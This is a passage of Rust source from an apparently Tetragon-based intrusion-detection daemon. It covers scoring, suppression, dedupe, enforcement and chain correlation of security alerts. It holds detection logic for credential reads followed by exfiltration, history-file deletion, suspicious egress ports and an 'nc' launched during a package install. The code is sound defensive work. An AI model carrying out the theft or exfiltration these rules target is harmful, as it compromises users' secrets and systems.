        // Staging an incident copies the file the alert names into
        // /var/lib/moat/incidents/<id>/file/<name>. That copy is a
        // credential-shaped file in a directory the user can read, so the next
        // recursive search walks into it, reads it, and raises a fresh
        // `moat-cred-*` alert -- which stages another copy, which is fresh bait
        // for the next scan. On 2026-09-04 that loop was half of every
        // browser-secret alert on this machine (15 of 30) with 10 staged
        // copies, and the newest incident directory was named by an alert about
        // reading the previous one.
        //
        // This is the path-side twin of the `proc.pid` guard above: that one
        // stops moat alerting on what it READS, this one stops it alerting on
        // what is read FROM it. Rules whose subject is this directory are
        // exempt, so a tamper rule still sees a deletion here.
        if let Some(p) = path.as_deref() {
            if self.is_own_store(p) && !SELF_WATCH_RULES.contains(&name) {
                return None;
            }
        }

        // A history file is only a history file if it is somebody's. The
        // kernel matches this rule by name alone (`Postfix /.bash_history`),
        // because a selector cannot ask whose home a path is in -- that answer
        // is in /etc/passwd, which the kernel cannot read. So it fires on that
        // name anywhere on the filesystem: on 2026-09-04 moat's own test suite
        // tripped it when `rm -rf` removed a sandbox tempdir containing a
        // throwaway $HOME, and because this rule is in the `rootkit` family
        // that turned an ordinary build into a HIGH chain.
        //
        // The signal here is that a real record of what was typed is gone.
        // Erasing a history file that is nobody's history erases no trail, so
        // the cut is exactly "is this in a real account's home".
        if name == HISTORY_TAMPER && !self.is_real_history(path.as_deref()?) {
            return None;
        }

        if let Err(m) = self
            .policies
            .validate(name, &hook_name, raw_path.as_deref(), &proc.exe)
        {
            return Some(self.mismatch_finding(*m, exec_id, proc, path));
        }

        let meta = self.policies.meta_or_fallback(name);
        let mut f = Finding::new(name, meta, proc);
        f.family_fixup();
        f.hook = hook_name;
        f.exec_id = exec_id.to_string();
        f.ancestry = self.table.ancestry(exec_id).into_iter().cloned().collect();
        f.ancestry_line = self.table.ancestry_line(exec_id);
        // The mode that governed *this rule*, which is "enforce" for a rule
        // armed individually even while the daemon stays in monitor.
        f.mode = self.mode_for(name);
        f.kill_expected = hook.action_is_kill();
        // Tetragon reports the CONFIGURED action in monitor mode too (NOTES
        // §7 says so for Sigkill, and Override is the same field). The kill
        // path waits for process_exit to prove it; a refusal has no such
        // event, so the only honest gate is whether the kernel policy for
        // this rule was enforcing. Without it, every monitor-mode deny policy
        // recorded `action_taken: blocked` beside `mode: monitor` and told the
        // user a connection had been refused that went straight through.
        let configured_deny = hook.action_is_deny();
        f.denied = configured_deny && f.mode == "enforce";
        if f.denied {
            f.extra_evidence.push(
                "the kernel refused this operation: it returned EPERM to the program, which is \
                 still running and will have seen the call fail"
                    .to_string(),
            );
        } else if configured_deny {
            f.extra_evidence.push(
                "the policy is configured to refuse this, but it was in monitor mode: the \
                 operation went ahead and was only reported"
                    .to_string(),
            );
        }

        if let Some(path) = path {
            f.hook_detail = access_word(hook.int_arg());
            // A setuid bit an unprivileged user sets on a file that user
            // already owns grants nothing.
            //
            // setuid means "run as the file's OWNER". When the owner is the
            // uid already running, that is the identity it has; the bit
            // confers no privilege. This is the semantics of the bit, not a
            // fact about any build tool -- which matters, because the shape it
            // removes is every source build on this machine: `makepkg ->
            // fakeroot -> debugedit` chmodding a staged `chrome-sandbox` under
            // the user's own ~/.cache as uid 1000. That one step is what
            // pushed ordinary package updates to critical, through the
            // `priv + 2 families` rung in `chain::escalate`.
            //
            // The genuinely privileged moment -- pacman installing that file
            // 4755 and root-owned into /opt -- is a different event with a
            // different owner, and this leaves it alone.
            if is_setuid_rule(name) {
                if let Some(reason) = setuid_grants_nothing(&f, &path) {
                    f.meta.severity = "low".to_string();
                    f.extra_evidence.push(reason);
                }
            }
            f.file = Some(crate::alert::FileRef { path, sha256: None });
        } else if let Some((ip, port)) = hook.dest() {
            f.net = Some(crate::alert::NetRef {
                dst_ip: ip,
                dst_port: port,
                domain: None,
                domain_age_secs: None,
                domain_cname: None,
                domain_queried_by: None,
            });
        }

        // The kernel watches suspicious ports for every process; being inside a
        // package install is what turns "unusual" into "act on this".
        if name == SUSPICIOUS_PORT_EGRESS {
            if let Some((root, why)) = pkgtree::pkg_root_with_reason(&self.table, exec_id) {
                let from = std::mem::replace(&mut f.meta.severity, "high".into());
                f.extra_evidence.push(pkgtree::root_evidence(root, &why));
                f.extra_evidence.push(format!(
                    "raised from {} to high: the connecting process is inside a `{}` install, so \
                     this is an install script talking to an unusual port, not a program you started",
                    from,
                    root.comm()
                ));
            }
        }
        if let Some(msg) = &hook.ev.message {
            if !msg.is_empty() {
                f.extra_evidence.push(format!("policy message: {}", msg));
            }
        }
        if let Some(action) = &hook.ev.action {
            f.extra_evidence.push(format!(
                "policy action: {} (mode {}; a kill is only recorded once process_exit reports SIGKILL)",
                action, f.mode
            ));
        }
        Some(f)
    }

    /// The record we keep instead of raising a policy alert we cannot stand
    /// behind. Low severity on purpose: the sensor misbehaved, the workload did
    /// not, and the only useful action is to look at the policy.
    fn mismatch_finding(
        &self,
        m: Mismatch,
        exec_id: &str,
        proc: crate::proctable::ProcInfo,
        path: Option<String>,
    ) -> Finding {
        let would_be = self.policies.meta_or_fallback(&m.policy);
        let mut f = Finding::new(
            crate::rules::SENSOR_MISMATCH,
            crate::rules::sensor_mismatch_meta(&m.why()),
            proc,
        );
        f.hook = m.hook.clone();
        f.exec_id = exec_id.to_string();
        f.ancestry = self.table.ancestry(exec_id).into_iter().cloned().collect();
        f.ancestry_line = self.table.ancestry_line(exec_id);
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "Tetragon reported {} for {}, which that policy's own selectors exclude, so no {} alert was raised.",
            m.policy, m.reported, m.policy
        ));
        f.extra_evidence = vec![
            format!(
                "policy: {} (would have been {}: {})",
                m.policy, would_be.severity, would_be.title
            ),
            format!("reported by the kernel: {}", m.reported),
            m.selector_line(),
            "the suppressed policy alert is not in alerts.jsonl; this record is kept so a \
             misbehaving sensor is visible rather than silent"
                .to_string(),
        ];
        // The usual cause is a sensor fault. THIS cause is not, and saying
        // "the sensor misbehaved" sent a person looking in the wrong place for
        // an hour on 2026-09-07: the reported name is a SCRIPT, so the kernel
        // matched its interpreter -- which the selector does not exclude -- and
        // the selector and the match never disagreed at all.
        if let Some(interp) = crate::util::interpreter_of(&m.reported) {
            f.extra_evidence.push(format!(
                "{} is a script: the kernel matched {}, which the selector above does not \
                 exclude, so the sensor and the selector do not actually disagree. An \
                 exclusion naming a script can never take effect.",
                m.reported, interp
            ));
            // And when the policy DENIES, the operation already failed. A
            // suppressed alert then hides a block the user is living with --
            // the one silence this daemon promises not to produce.
            if would_be.enforce == "deny" {
                f.meta.severity = "high".into();
                f.extra_evidence.push(format!(
                    "{} refuses this operation in the kernel, so it WAS refused -- suppressing \
                     its alert would have left a denial with nothing to explain it. That is why \
                     this record is not low.",
                    m.policy
                ));
            }
        }
        if let Some(p) = path {
            f.file = Some(crate::alert::FileRef {
                path: p,
                sha256: None,
            });
        }
        f
    }

    /// Subscribe to systemd-resolved's query stream. Called from `run`, not
    /// from `new`: a constructor that spawns a thread and connects to a
    /// socket is a constructor every test pays for.
    pub fn start_names(&mut self) {
        if !self.cfg.names.enabled || self.names_rx.is_some() {
            return;
        }
        self.names_rx = Some(crate::names::spawn(&self.cfg.names));
        self.names_state = "connecting".into();
    }

    /// Move what the reader has seen into the cache. Runs on every pass of
    /// the loop, BEFORE the sensor's lines are handled, so a resolution that
    /// preceded a connection is in the cache when the connection is judged.
    pub fn drain_names(&mut self, now: u64) {
        let Some(rx) = self.names_rx.as_ref() else {
            return;
        };
        loop {
            match rx.try_recv() {
                Ok(crate::names::Msg::State(st)) => {
                    if st != self.names_state {
                        log::info!("names: {}", st);
                    }
                    self.names_state = st;
                }
                Ok(crate::names::Msg::Resolved(rs)) => {
                    for r in &rs {
                        self.names.record(r, now);
                    }
                }
                Err(std::sync::mpsc::TryRecvError::Empty) => break,
                Err(std::sync::mpsc::TryRecvError::Disconnected) => {
                    self.names_state = "reader exited".into();
                    self.names_rx = None;
                    break;
                }
            }
        }
    }

    /// Put the resolved name on a net finding, or say plainly that there is
    /// none. One place, for every path that builds a finding, so no rule can
    /// forget and no rule has to know where names come from.
    ///
    /// A hit in either domain list becomes the finding's IOC here too, so a
    /// first-contact or egress alert to a fed domain is scored as an IOC
    /// (`scoring::has_ioc`) whichever rule raised it. The dedicated
    /// `moat-x-net-domain-ioc` rule exists for the connections no other rule
    /// reports -- a familiar /24, a registry CIDR.
    /// "Who asked for this name", if the varlink probe saw the lookup.
    ///
    /// Returns `(who, evidence line)`. Split out because it has to run in two
    /// places: when the name arrived from the resolved-stream cache, and when a
    /// rule set it by matching the feed. The claim is about the NAME, not about
    /// how the name got onto the finding.
    ///
    /// "a DIFFERENT process" is called out rather than left for the reader: a
    /// browser and its helpers split resolve-and-connect constantly, and so
    /// does a payload that resolves a name and hands the address to something
    /// else.
    fn asker_evidence(
        queries: &crate::names::QueryLog,
        name: &str,
        connecting_pid: u32,
        now: u64,
    ) -> Option<(String, String)> {
        let a = queries.asked_by(name, now)?;
        let who = format!("{} (pid {})", a.exe, a.pid);
        let same = connecting_pid == a.pid;
        let line = format!(
            "asked by: {} looked {} up {} before this connection{}",
            who,
            name,
            crate::util::human_secs(now.saturating_sub(a.at)),
            if same {
                " -- the same process that connected"
            } else {
                " -- a DIFFERENT process than the one that connected"
            }
        );
        Some((who, line))
    }

    fn enrich_names(&self, f: &mut Finding, now: u64) {
        let Some(net) = f.net.as_mut() else {
            return;
        };
        // A rule may already have put a name here by matching the feed. The
        // address cache below cannot improve on that -- but the query probe can
        // still say WHO asked, and a feed hit is exactly the alert where that
        // matters most. Until 2026-09-11 this early-returned on a set domain,
        // so a `moat-x-net-domain-ioc` alert never named the asker: the one
        // alert that most needed it was the one that never got it.
        if let Some(name) = net.domain.clone() {
            if net.domain_queried_by.is_none() {
                if let Some((who, line)) =
                    Self::asker_evidence(&self.queries, &name, f.proc.pid, now)
                {
                    net.domain_queried_by = Some(who);
                    f.extra_evidence.push(line);
                }
            }
            return;
        }
        let looked_up = net
            .dst_ip
            .parse::<std::net::IpAddr>()
            .ok()
            .and_then(|ip| self.names.lookup(&ip, now));
        match looked_up {
            Some(l) => {
                net.domain = Some(l.name.clone());
                net.domain_age_secs = Some(l.age_secs);
                net.domain_cname = l.cname.clone();
                let mut line = format!(
                    "name: {} was resolved to {} {} before this connection ({})",
                    l.name,
                    net.dst_ip,
                    crate::util::human_secs(l.age_secs),
                    crate::names::SOURCE
                );
                if let Some(c) = &l.cname {
                    line.push_str(&format!("; the answer came via {}", c));
                }
                if let Some(ttl) = l.ttl {
                    line.push_str(&format!("; the record's TTL was {} s", ttl));
                }
                f.extra_evidence.push(line);
                // Who ASKED, when the varlink kprobe saw it. This is the half
                // the resolved stream cannot supply: it reports resolutions
                // without saying which client made them, so `domain` alone is
                // an inference from the address. This is observed in the asking
                // process's own context.
                if let Some((who, line)) =
                    Self::asker_evidence(&self.queries, &l.name, f.proc.pid, now)
                {
                    net.domain_queried_by = Some(who);
                    f.extra_evidence.push(line);
                }
                if f.ioc.is_none() {
                    if let Some(hit) = self.feeds.domain_hit(&l.name) {
                        f.ioc = Some(crate::alert::IocRef {
                            source: "domain-feed".into(),
                            matched: hit.matched(),
                        });
                        f.extra_evidence.push(hit.evidence(&l.name, &self.feeds.meta));
                    }
                }
            }
            None => {
                let why = match self.names_state.as_str() {
                    "off" => "name resolution artifacts are off ([names] enabled = false)".to_string(),
                    "connected" => format!(
                        "no resolution of {} was seen by {} in the last {} -- a literal address, \
                         a name resolved before that, or DNS that bypassed the system resolver \
                         (DNS-over-HTTPS inside the program, a container with its own DNS)",
                        net.dst_ip,
                        crate::names::SOURCE,
                        crate::util::human_secs(self.cfg.names.retain_secs)
                    ),
                    other => format!("the {} query stream is not available: {}", crate::names::SOURCE, other),
                };
                f.extra_evidence.push(format!("name: not recorded -- {}", why));
            }
        }
    }

    fn emit_all(&mut self, findings: Vec<Finding>) {
        for f in findings {
            self.emit(f);
        }
    }

    /// Score, look up rarity, apply the allowlist, dedupe, append.
    ///
    /// BASELINE §8 changed the shape of this path: a suppressed alert is no
    /// longer dropped on the floor. It is scored, counted for rarity, recorded
    /// with `suppressed_by` set so the timeline can grey it out, and left out of
    /// the badge — because a suppression the user cannot see is exactly the kind
    /// of silence this project promises not to produce.
    pub fn emit(&mut self, mut f: Finding) -> Option<String> {
        let now = util::unix_secs();

        // --- 0. the mode that governed THIS rule ---------------------------
        // Stamped here, once, for every finding whatever path built it. The
        // policy path already did this; the userland rules (`RuleCtx::finding`)
        // wrote the daemon-wide mode instead, so `moat-net-first-contact` --
        // which is both a policy and a userland rule -- recorded `mode:
        // monitor` on the alert while `status.enforcing_rules` listed it.
        f.mode = self.mode_for(&f.rule);

        // --- 1. who acted, and from where (BASELINE §1 and §2b) -------------
        f.actor = self.provenance.classify_proc(&f.proc);
        // A package-owned file that is not the file its package shipped is its
        // own finding, not just a modifier on this one. Demoting the actor to
        // `foreign` makes every OTHER alert about it read louder, which is
        // right, but on a quiet machine nothing else may ever fire -- and then
        // the most interesting fact moat knows would never be said out loud.
        self.report_modified_binary(&f.actor, &f.proc);
        f.context = context::classify(&self.table, &f.exec_id, &self.cfg.context);
        f.extra_evidence.push(context::evidence(
            &self.table,
            &f.exec_id,
            f.context,
            &self.cfg.context,
        ));
        // Before scoring: a domain-feed hit sets `ioc`, and the score reads it.
        self.enrich_names(&mut f, now);

        // --- 2. severity (BASELINE §2 and §2b) ------------------------------
        let build_tool = self.build_tool_in_chain(&f.exec_id);
        let score = {
            let facts = EventFacts {
                family: &f.meta.family,
                rule: &f.rule,
                hook: &f.hook,
                exe: &f.proc.exe,
                file: f.file.as_ref().map(|x| x.path.as_str()),
                has_net: f.net.is_some(),
                has_ioc: f.ioc.is_some(),
                build_tool_in_chain: build_tool,
                homes: &self.homes,
                // The sensor's word only, as everywhere a decision rests on it:
                // `containerised()` would accept an ancestor named `runc`, and
                // buying quiet with a filename is exactly the hole that closes.
                in_container: self.containerised_for_enforcement(&f.proc),
            };
            scoring::score(
                &f.meta.severity,
                &facts,
                &f.actor,
                f.context,
                self.cfg.baseline.provenance_downgrade,
            )
        };
        f.score = Some(score);

        // --- 3. rarity (LEARNING §1), whether or not this is suppressed -----
        f.rarity = Some(self.observe_rarity(&f, now));

        // --- 4. allowlist: suppression is recorded, not silent --------------
        let parents: Vec<String> = f.ancestry.iter().map(|p| p.exe.clone()).collect();
        let cand = Candidate {
            rule: &f.rule,
            exe: &f.proc.exe,
            file: f.file.as_ref().map(|x| x.path.as_str()),
            parents,
            // What the interpreter was actually running, so an entry can name
            // `gcloud.py` instead of blessing `python3`.
            script: f.actor.script.as_deref(),
            // The resolved name and the entry that fired, so an allowlist entry
            // can name the domain instead of blessing the browser.
            domains: crate::allowlist::domain_candidates(
                f.net.as_ref().and_then(|n| n.domain.as_deref()),
                f.ioc.as_ref().map(|i| i.matched.as_str()),
            ),
        };
        if let Some(hit) = self.allowlist.find(&cand) {
            let by = format!(
                "{}#{}",
                hit.source
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_else(|| hit.source.display().to_string()),
                hit.index
            );
            log::debug!("{} suppressed by allowlist entry {}", f.rule, by);
            f.suppressed_by = Some(by);
        }

        // Record a credential read against its session, for the exfil-context
        // gate in `net_first_contact` (see `cred_read_sessions`). A suppressed
        // read is the user's own tool doing its job and does not count.
        //
        // This has to run AFTER step 4, and until 2026-09-08 it ran before it.
        // The `suppressed_by.is_none()` test was written to mean "the allowlist
        // did not excuse this read", but at the top of `emit` the allowlist has
        // not been consulted yet, so the field was still None for every finding
        // and the guard never once refused. Every allowlisted credential read
        // -- gcloud reading its own store, an app reading its own profile --
        // armed the exfil context, and the next ordinary connection from that
        // session became a first-contact report it should not have been.
        //
        // NOT covered by a test, deliberately rather than by omission: the
        // replay fixture's processes are synthetic, `sid` is read from /proc,
        // and no /proc entry exists for a fake pid -- so `cred_read_sessions`
        // stays empty in that fixture whether the guard fires or not, and a
        // test written against it passes with the guard deleted (measured).
        // Verified instead by reading the order: step 4 assigns `suppressed_by`
        // above. Covering it needs a cred finding built with a real session id.
        if f.meta.family == "cred" && f.suppressed_by.is_none() {
            if let Some(sid) = self.table.get(&f.exec_id).and_then(|p| p.sid) {
                // Drop entries older than the window the gate cares about, so
                // the map is bounded by live sessions rather than uptime.
                self.cred_read_sessions
                    .retain(|_, t| now.saturating_sub(*t) <= 120);
                self.cred_read_sessions.insert(sid, now);
            }
        }

        // --- 5. the noise guard's demotion is not a suppression -------------
        // Demotion is scoped to the tuple that was noisy, not the whole rule
        // (BASELINE §4): a rule silenced by this machine's own builds must not
        // also silence a shape of it that nobody has ever seen.
        f.demoted = self
            .baseline
            .is_demoted_tuple(&f.rule, &noise_tuple(&f));

        // --- 6. the receipt sees it too (LEARNING §3) -----------------------
        // Suppressed findings included: the write still happened, and a receipt
        // records what the install did, not what moat shouted about.
        self.note_receipt_finding(&f);

        // Is this a fold of an alert we already have?
        let key = f.dedupe_key();
        let folded = self
            .dedupe
            .get(&key)
            .filter(|d| now.saturating_sub(d.first_seen) < self.cfg.thresholds.dedupe_secs)
            .map(|d| d.id.clone());

        // The id is allocated here, before anything is killed, because the
        // incident snapshot is named after it and has to be taken while the
        // process still exists (LEARNING §4). A fold reuses the first id and is
        // not captured twice.
        let id = match folded.clone() {
            Some(existing) => existing,
            None => self.next_id(),
        };
        let incident = if folded.is_none() {
            self.capture_incident(&f, &id)
        } else {
            None
        };

        // Enforcement happens before dedupe: the second `nc` of an install is
        // just as fatal as the first, even when its alert folds into one line.
        // A suppressed finding is never enforced — the user said it is fine.
        let killed = if f.suppressed_by.is_none() {
            self.maybe_enforce(&mut f)
        } else {
            false
        };

        if let Some(existing) = folded {
            let count = match self.dedupe.get_mut(&key) {
                Some(d) => {
                    d.count += 1;
                    d.count
                }
                None => 1,
            };
            let mut update = UpdateLine::new(&existing)
                .set("count", Value::from(count))
                .set("ts", Value::from(util::now_rfc3339()));
            if killed {
                update = update.set("action_taken", Value::from("killed"));
            }
            if let Err(e) = self.store.append_update(&update) {
                log::error!("alerts.jsonl: {}", e);
            }
            self.note_baseline(&f, now);
            // A FOLD IS STILL A THING THAT HAPPENED.
            //
            // Until 2026-09-07 this returned here, so a folded event never
            // reached correlation -- and that is why `dedupe_key` carries the
            // pid: without it, a second process tree writing ~/.bashrc folded
            // into the first and its persist step never formed a chain. The
            // key was made narrower to protect the chain.
            //
            // The cost was that the deduper stopped collapsing anything from
            // repeated SHORT-LIVED processes, which is what a CLI tool is:
            // measured, `kubectl` produced 69 rows with 69 distinct pids and
            // one destination. Two jobs -- "is this a new row" and "does this
            // reach correlation" -- were being decided by one key, and only
            // one of them wanted the pid.
            //
            // So the fold now correlates too, and the key no longer needs to
            // carry a pid to protect it. The alert is rebuilt rather than
            // stored on the dedupe entry: `build_alert` is assembly, and
            // keeping a live Alert per key would put an unbounded copy of the
            // record in memory beside the record.
            let folded_alert = build_alert(
                &f,
                &existing,
                &util::now_rfc3339(),
                &self.cfg.paths.user_allowlist().display().to_string(),
                &allowlist_note(
                    &self.cfg.paths.allowlist_dir.display().to_string(),
                    self.allowlist.len(),
                    &f.proc.exe,
                    f.file.as_ref().map(|x| x.path.as_str()),
                ),
            );
            self.note_chain(&f, &folded_alert, now);
            return Some(existing);
        }

        let note = allowlist_note(
            &self.cfg.paths.allowlist_dir.display().to_string(),
            self.allowlist.len(),
            &f.proc.exe,
            f.file.as_ref().map(|x| x.path.as_str()),
        );
        let mut alert = build_alert(
            &f,
            &id,
            &util::now_rfc3339(),
            &self.cfg.paths.user_allowlist().display().to_string(),
            &note,
        );
        if killed {
            alert.action_taken = "killed".into();
        }
        self.fill_siblings(&f, &mut alert);
        // A container is watched, not asked about -- unless you asked to be.
        //
        // The kernel already refuses to ENFORCE inside a container
        // (render::split_container_enforcement); this is the other half, and it
        // is only about the badge. The row is written, keeps its severity, stays
        // on the timeline and stays a chain member, so a real sequence that runs
        // through a container still reaches you: `note_chain` re-stamps trigger
        // members to `alerts` when a chain goes high, and that runs after this.
        // What stops is one build's worth of setuid layer-unpacking and toolchain
        // fetches asking 452 questions in a night.
        //
        // Asked of the SENSOR, not of /proc. The first version of this read
        // /proc/<pid>/ns/mnt and defaulted to "not a container" when the pid was
        // gone -- which is every process this is about. Twenty container psql
        // and pg_isready rows reached the badge on 2026-09-08 with the switch
        // off, because each had exited before moatd looked. `ProcInfo`
        // carries what `process.ns` said at event time instead.
        //
        // NOT for a package install. moat's own sandbox runs npm, pip, cargo
        // and makepkg under bwrap, which gives them their own mount namespace,
        // so `is_host` is false and this cannot tell moat's box from Docker. On
        // 2026-09-08 that demoted a HOST `makepkg` build to the timeline under
        // a reason that read "package install: never downgraded; shown on the
        // timeline only" -- the sentence contradicting itself in one line. The
        // package-install path is the one moat exists for; it is never
        // downgraded, and a namespace it entered because moat put it there is
        // the worst possible reason to start.
        // The sensor is the authority; the ancestry is the fallback for the
        // (common) case where it said nothing. See
        // `util::ancestry_looks_containerised` for why both are needed and what
        // the fallback costs.
        let chain: Vec<String> = f.ancestry.iter().map(|a| a.exe.clone()).collect();
        let runtime_in_chain = crate::util::ancestry_looks_containerised(&chain);
        let containerised = self.containerised(&f.proc, &f.ancestry);

        // The package-install exemption is narrower than it first looked.
        //
        // It exists because moat's own sandbox runs npm, pip, cargo and makepkg
        // under bwrap, and a HOST build hidden by a namespace moat itself
        // created was the 2026-09-08 makepkg bug. But `cargo build` inside a
        // `docker build` is ALSO pkg-install, and exempting that put a
        // containerised cargo on the badge with the switch off.
        //
        // bwrap is not a container runtime and never appears in
        // `CONTAINER_RUNTIMES`; runc, containerd-shim and dockerd do. So a
        // runtime in the ancestry means a real container and the exemption does
        // not apply; container-ness known ONLY from the namespace is the
        // sandbox case, and there the install still wins.
        let sandbox_not_container = !runtime_in_chain;
        let protected_install = sandbox_not_container
            && (f.context == crate::context::Context::PkgInstall || f.pkg_install_escalation());
        if !self.inspect_containers
            && alert.surface == "alerts"
            && containerised
            && !protected_install
        {
            alert.surface = "timeline".into();
            alert.severity_reason = format!(
                "{}; shown on the timeline only: this ran in a container ({}) and \
                 container inspection is off",
                alert.severity_reason,
                if f.proc.in_container.is_some() { "per the sensor" } else { "per its ancestry" }
            );
        }
        if let Err(e) = self.store.append_alert(&alert) {
            log::error!("alerts.jsonl: {}", e);
            return None;
        }
        // The snapshot is appended as an update rather than being folded into
        // the record above, so a slow /proc walk can never delay the alert
        // itself (LEARNING §9).
        if let Some(inc) = incident {
            self.incidents_captured += 1;
            log::info!(
                "alert {}: incident snapshot in {} ({} file(s))",
                id,
                inc.dir,
                inc.files.len()
            );
            let u = UpdateLine::new(&id).set(
                "incident",
                serde_json::to_value(&inc).unwrap_or(Value::Null),
            );
            if let Err(e) = self.store.append_update(&u) {
                log::error!("alerts.jsonl: {}", e);
            }
        }
        // Correlation runs on the record, after it exists, because a chain is
        // written back onto every member — including members that were already
        // on disk before this one made the sequence visible.
        self.note_chain(&f, &alert, now);
        if alert.is_suppressed() {
            self.alerts_suppressed += 1;
        } else {
            self.alerts_emitted += 1;
        }
        log::info!(
            "alert {} {} {} pid {} ({}){}",
            id,
            alert.severity,
            alert.rule,
            alert.process.pid,
            alert.title,
            alert
                .suppressed_by
                .as_ref()
                .map(|b| format!(" [suppressed by {}]", b))
                .unwrap_or_default()
        );
        self.dedupe.insert(
            key,
            Dedupe {
                id: id.clone(),
                first_seen: now,
                count: 1,
            },
        );
        if f.kill_expected && !f.exec_id.is_empty() {
            self.pending_kill.insert(f.exec_id.clone(), id.clone());
        }

        self.note_baseline(&f, now);
        // Only what the user can actually SEE counts as noise.
        //
        // Three exclusions, for the same reason. A suppressed alert is one the
        // user already answered; a `signal`-tier row is one the RULE says is
        // not a conclusion; and a finding that never reaches the badge on
        // severity is not something anyone is being asked about -- demoting it
        // would move it from the timeline to the timeline, while still raising
        // a `moat-x-noisy-rule` alert that DOES surface. Counting timeline rows
        // would mean every `sudo` on the machine (medium, timeline, by design)
        // producing a noise complaint within a day, and then -- through the
        // re-demotion counter -- an offer to allowlist sudo. Noise about
        // noise, generated by the machinery meant to reduce it.
        //
        // Deliberately `surface_for(severity)` and NOT `alert.surface`: a row
        // this guard has already demoted still has to be counted, or the
        // rolling 24 h window would age out under a live flood and
        // `clear_stale_demotions` would hand the flood back to the badge.
        // `note_alert` returns `None` for an already-demoted tuple, so counting
        // it costs one map lookup and raises nothing.
        let on_the_badge = crate::scoring::surface_for(f.severity()) == "alerts";
        if f.suppressed_by.is_none() && !f.is_building_block() && on_the_badge {
            if let Some(d) = self.baseline.note_alert(&f.rule, &noise_tuple(&f), now) {
                self.quieten_backlog(&d);
                self.raise_noisy_rule(&d, now);
            }
        }
        Some(id)
    }

    /// BASELINE §4's retroactive half, done by the one party that knows the
    /// demotion's real scope.
    ///
    /// "Stop asking me about this" has to cover what is already on the badge,
    /// not only what comes next. Until now that was the PANEL's job: it read
    /// `status.demoted_rules` and timelined every alert of every listed rule.
    /// But that list is the one a person wants -- a rule with a single noisy
    /// pattern is on it -- while a demotion here is per pattern, and the chain
    /// correlator re-surfaces a demoted rule's step on purpose when a sequence
    /// reaches `high`. So the panel silenced things this daemon had
    /// deliberately surfaced: on 2026-09-05 a 64-step `makepkg` chain raised
    /// to `high` read "expected" on every screen because its rules were on
    /// the list. Restamping the covered backlog HERE, per pattern, means the
    /// panel can read `surface` and nothing else.
    ///
    /// Only alerts the demotion actually covers move: unacked, on the badge,
    /// this rule, and this pattern. Two are left alone.
    ///
    /// A trigger step of a chain that reached `high`: the correlator put it
    /// back on the badge knowing the rule was noisy, and the noise guard does
    /// not get to undo correlation.
    ///
    /// And an alert the context matrix escalated inside a **package install**.
    /// That is the 2026-09-04 failure closed in general rather than for one
    /// path: a `/tmp` dropper executed by a package `preinstall` went to the
    /// timeline because the developer's own `cargo test` had made a different
    /// shape of the same rule noisy. Frequency on this machine is not evidence
    /// about a package install, and a demotion is arithmetic about frequency.
    fn quieten_backlog(&mut self, d: &Demotion) {
        let high = crate::alert::severity_rank("high");
        let mut moved = 0usize;
        for a in self.store.load() {
            if a.rule != d.rule || a.acked || a.surface != "alerts" {
                continue;
            }
            if a.tuple_key() != d.tuple {
                continue;
            }
            if a.pkg_install_escalation {
                continue;
            }
            let raised_by_chain = a.chain.as_ref().is_some_and(|c| {
                crate::alert::severity_rank(&c.severity) >= high
                    && c.steps.iter().any(|s| s.alert == a.id && s.is_trigger())
            });
            if raised_by_chain {
                continue;
            }
            let u = UpdateLine::new(&a.id).set("surface", Value::from("timeline"));
            if let Err(e) = self.store.append_update(&u) {
                log::error!("alerts.jsonl: {}", e);
                return;
            }
            moved += 1;
        }
        if moved > 0 {
            log::info!(
                "noise guard: {} earlier alert(s) of {} moved to the timeline with the demotion",
                moved,
                d.rule
            );
        }
    }

    /// Offer a freshly written alert to the chain correlator, and write the
    /// resulting sequence back onto every alert in it (design 2b, 3a).
    ///
    /// Only whole alerts get here — a dedupe fold is the same event again, and
    /// a story is about different events. That also keeps the write cost tied
    /// to the number of distinct alerts rather than to a burst's volume.
    ///
    /// Each member carries the entire chain, rather than a pointer to a head
    /// record, so a reader that has folded `alerts.jsonl` can draw 2b from
    /// whichever alert the user opened without a second lookup. The cost is
    /// that a growing chain rewrites itself onto its members; `ChainStore::note`
    /// only hands one back when the story on disk actually changed, which caps
    /// that at roughly `MAX_STEPS` (12) republishes of at most `MAX_STEPS` lines
    /// each — a few hundred kB against a 20 MB rotation, however many
    /// detections one tree trips.
    fn note_chain(&mut self, f: &Finding, alert: &Alert, now: u64) {
        let lineage: Vec<chain::LineageNode> = std::iter::once(&f.proc)
            .chain(f.ancestry.iter())
            .map(|p| chain::LineageNode {
                exec_id: p.exec_id.clone(),
                pid: p.pid,
                exe: p.exe.clone(),
                sid: p.sid,
            })
            .collect();
        let Some(c) = self.chains.note(chain::Observation {
            alert: alert.id.clone(),
            ts: alert.ts.clone(),
            at: now,
            family: alert.family.clone(),
            rule: alert.rule.clone(),
            severity: alert.severity.clone(),
            title: alert.title.clone(),
            rarity: alert.rarity,
            // "Silenced" means *someone decided this specific thing is fine*:
            // the user's own allowlist entry, or the noise guard having watched
            // this exact tuple fire all day. Both are on the finding already.
            //
            // It deliberately does NOT read `alert.surface`. That was the bug
            // behind the 2026-09-04 20:41 miss: `scoring::surface_for` is a
            // pure function of severity — medium and low are *always*
            // `timeline` — so testing it here silently reimposed a `high` floor
            // on every trigger, on top of the documented `medium` one, and a
            // chain of two mediums could never form. A rule that is weak on its
            // own is the whole reason this module exists; it is the prime
            // candidate for a sequence, not a thing to discount.
            // ONLY the user's own allowlist silences a step.
            //
            // A noise-guard demotion used to count here too, and it is a
            // different kind of statement: the allowlist is the user saying
            // "this event is fine", while the guard is moat's own arithmetic
            // about how OFTEN a rule fires on this machine. Frequency is not
            // consent, and correlation exists precisely because events that are
            // ordinary alone are not ordinary together -- so letting the volume
            // heuristic veto a step meant any rule that ever got noisy became
            // permanently unable to contribute to a sequence.
            //
            // On 2026-09-04 that hid a live AUR attack: `makepkg` egressed to a
            // host outside the registry and executed a dropped binary from
            // /tmp, and the /tmp exec -- `high`, `first_seen`, the strongest
            // signal in the whole run -- was demoted rule-wide because the
            // user's own `cargo test` trips the same rule. It joined the chain
            // as context, the remaining triggers were `low`/`medium`, and the
            // chain came out `medium` with nothing on the badge.
            silenced: f.suppressed_by.is_some(),
            lineage,
        }) else {
            return;
        };
        log::warn!(
            "chain {} {} ({} steps, {}): {}",
            c.id,
            c.severity,
            c.steps_total,
            c.severity_reason,
            c.summary
        );
        let value = match serde_json::to_value(&c) {
            Ok(v) => v,
            Err(e) => {
                log::error!("chain {}: {}", c.id, e);
                return;
            }
        };
